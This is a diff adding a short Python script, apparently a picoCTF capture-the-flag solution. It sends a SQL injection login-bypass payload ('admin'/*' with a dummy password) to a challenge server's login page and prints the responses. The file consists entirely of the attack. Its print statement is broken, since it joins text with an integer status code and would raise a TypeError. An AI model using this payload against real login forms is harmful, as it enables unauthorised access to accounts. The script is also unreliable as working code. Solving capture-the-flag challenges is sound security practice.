@@ -1,0 +1,15 @@
+import requests
+
+HOST = 'http://jupiter.challenges.picoctf.org:9683/index.php'
+
+
+def sqlInjectionLogin(user, password):
+    injections = [("admin'/*","pass")]
+    s = requests.Session()
+    for i in range(len(injections)):
+        u , p = injections[i]
+        r = s.post(HOST,data= {user:u, password:p})
+        print("Status code" + r.status_code + "Response Text" + r.text)
+    return
+if __name__ == "__main__":
+    sqlInjectionLogin("user", "pass")
